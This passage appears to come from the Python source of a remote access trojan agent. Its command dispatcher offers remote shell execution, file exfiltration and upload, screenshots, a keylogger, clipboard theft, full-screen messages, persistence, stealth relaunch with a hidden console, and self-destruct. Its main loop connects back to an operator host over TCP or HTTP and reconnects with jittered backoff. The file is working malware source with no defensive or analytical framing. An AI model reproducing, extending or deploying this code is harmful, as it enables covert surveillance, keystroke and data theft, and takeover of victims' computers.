        send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})
        return
    send(sock, {
        "t": "result", "id": rid, "ok": True,
        "out": "%d bytes" % len(data),
        "file": os.path.basename(path), "size": len(data),
    })
    seq = 0
    for off in range(0, len(data), _CHUNK):
        send(sock, {"t": "chunk", "id": rid, "seq": seq,
                    "data": base64.b64encode(data[off:off + _CHUNK]).decode()})
        seq += 1
    send(sock, {"t": "chunk_end", "id": rid})


def recv_upload(sock, rid, path):
    data = bytearray()
    while True:
        m = recv(sock)
        t = m.get("t")
        if t == "chunk":
            data += base64.b64decode(m.get("data", ""))
        elif t == "chunk_end":
            break
        elif t == "cmd":
            send(sock, {"t": "result", "id": m.get("id"), "ok": False,
                        "out": "[!] upload aborted by new command"})
            return
    try:
        parent = os.path.dirname(os.path.abspath(path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        send(sock, {"t": "result", "id": rid, "ok": True,
                    "out": "wrote %d bytes -> %s" % (len(data), os.path.abspath(path))})
    except Exception as exc:
        send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})


# -------------------------------------------------------------------- dispatch
def dispatch(sock, rid, op, args):
    def ok(text):
        send(sock, {"t": "result", "id": rid, "ok": True, "out": str(text)})

    if op == "ping":
        return ok("pong")

    if op == "sysinfo":
        return ok(json.dumps(sysinfo(), indent=2))

    if op == "shell":
        return ok(run_shell(args.get("cmd", "")))

    if op == "cd":
        target = os.path.expanduser(args.get("path") or "~")
        os.chdir(target)
        STATE["cwd"] = os.getcwd()
        return ok(STATE["cwd"])

    if op == "pwd":
        return ok(STATE["cwd"])

    if op == "ls":
        return ok(list_dir(args.get("path")))

    if op == "download":
        return send_file(sock, rid, args.get("path", ""))

    if op == "upload":
        if args.get("data_b64") is not None:
            raw = base64.b64decode(args.get("data_b64") or "")
            path = args.get("path") or "upload.bin"
            try:
                parent = os.path.dirname(os.path.abspath(path))
                if parent:
                    os.makedirs(parent, exist_ok=True)
                with open(path, "wb") as f:
                    f.write(raw)
                return ok("wrote %d bytes -> %s" % (len(raw), os.path.abspath(path)))
            except Exception as exc:
                return ok("[!] %s" % exc)
        return recv_upload(sock, rid, args.get("path", ""))

    if op == "screenshot":
        path, note = screenshot()
        if not path:
            send(sock, {"t": "result", "id": rid, "ok": False, "out": note})
            return
        send_file(sock, rid, path)
        try:
            os.remove(path)
        except OSError:
            pass
        return

    if op == "frame":
        path, note = capture_jpeg(args.get("width", 1280), args.get("quality", 55))
        if not path:
            send(sock, {"t": "result", "id": rid, "ok": False, "out": note})
            return
        send_file(sock, rid, path)
        try:
            os.remove(path)
        except OSError:
            pass
        return

    if op == "placa":
        action = (args.get("action") or "show").lower()
        if action in ("off", "close", "hide"):
            return ok(close_placa())
        return ok(show_placa(args.get("text", ""), args.get("seconds", 0),
                             args.get("bg", "#000000"), args.get("fg", "#ff2d2d")))

    if op == "msg":
        return ok(show_msg(args.get("text", ""), args.get("title", "Aviso")))

    if op == "keylog":
        action = (args.get("action") or "dump").lower()
        if action == "start":
            inst = _KEYLOG["inst"]
            if inst and inst.is_alive():
                return ok("keylogger already running")
            inst = _Keylogger()
            inst.start()
            _KEYLOG["inst"] = inst
            return ok("keylogger started")
        if action == "stop":
            inst = _KEYLOG["inst"]
            if not inst:
                return ok("keylogger not running")
            inst.stop()
            data = inst.dump()
            _KEYLOG["inst"] = None
            return ok("keylogger stopped\n" + data)
        inst = _KEYLOG["inst"]
        return ok(inst.dump() if inst else "(keylogger not running)")

    if op == "clip":
        if (args.get("action") or "get").lower() == "set":
            return ok(clip_set(args.get("text", "")))
        return ok(clip_get())

    if op == "wallpaper":
        return ok(set_wallpaper(args.get("path", "")))

    if op == "power":
        return ok(power(args.get("action", "")))

    if op == "selfdestruct":
        notes = selfdestruct()
        ok("autodestruição armada\n" + notes)
        time.sleep(0.3)
        os._exit(0)

    if op == "persist":
        return ok(install())

    if op == "unpersist":
        return ok(uninstall())

    if op == "ps":
        return ok(process_list())

    if op == "kill":
        pid = int(args.get("pid", 0) or 0)
        if pid <= 0:
            return ok("[!] invalid pid")
        if IS_WIN:
            return ok(run_shell("taskkill /PID %d /F" % pid))
        try:
            os.kill(pid, 9)
            return ok("killed %d" % pid)
        except Exception as exc:
            return ok("[!] %s" % exc)

    if op == "sleep":
        STATE["sleep"] = max(0, int(args.get("seconds", 0) or 0))
        return ok("reconnect delay set to %ss" % STATE["sleep"])

    if op == "exit":
        ok("agent exiting")
        time.sleep(0.2)
        os._exit(0)

    return ok("[!] unknown op: %s" % op)


def serve(sock):
    while True:
        msg = recv(sock)
        if msg.get("t") != "cmd":
            continue
        rid = msg.get("id")
        op = msg.get("op")
        args = msg.get("args") or {}
        try:
            dispatch(sock, rid, op, args)
        except Exception as exc:
            try:
                send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})
            except Exception:
                raise


# ------------------------------------------------------------------------ main
def parse_args(argv):
    host, port, key = HOST, PORT, KEY
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("--host", "-H") and i + 1 < len(argv):
            host = argv[i + 1]
            i += 2
        elif a in ("--port", "-p") and i + 1 < len(argv):
            port = int(argv[i + 1])
            i += 2
        elif a in ("--key", "-k") and i + 1 < len(argv):
            key = argv[i + 1]
            i += 2
        else:
            i += 1
    return host, port, key


def main():
    global _KEY, TRANSPORT, HTTP_BASE, BOOTSTRAP
    host, port, key = parse_args(sys.argv[1:])
    _KEY = key.encode() if isinstance(key, str) else key

    for i, a in enumerate(sys.argv):
        if a == "--http" and i + 1 < len(sys.argv):
            TRANSPORT, HTTP_BASE = "http", sys.argv[i + 1]
        elif a == "--bootstrap" and i + 1 < len(sys.argv):
            BOOTSTRAP = sys.argv[i + 1]
            if not HTTP_BASE:
                TRANSPORT = "http"

    if "--install" in sys.argv:
        try:
            install()
        except Exception:
            pass

    if STEALTH and "--no-stealth" not in sys.argv and "--visible" not in sys.argv:
        if stealth_relaunch():
            return                      # hidden copy takes over, this one exits
        if not single_instance():
            return

    if IS_WIN and "--visible" not in sys.argv:
        hide_console()

    if TRANSPORT == "http" and (HTTP_BASE or BOOTSTRAP):
        http_loop(HTTP_BASE)            # never returns
        return

    delay = RECONNECT_MIN
    while True:
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=20)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(None)
            send(sock, {"t": "hello", "info": sysinfo()})
            delay = RECONNECT_MIN
            serve(sock)
        except Exception:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
        wait = STATE.get("sleep") or min(delay, RECONNECT_MAX)
        time.sleep(wait + random.uniform(0, wait * 0.4))
        delay = min(delay * 2, RECONNECT_MAX)


if __name__ == "__main__":
    main()
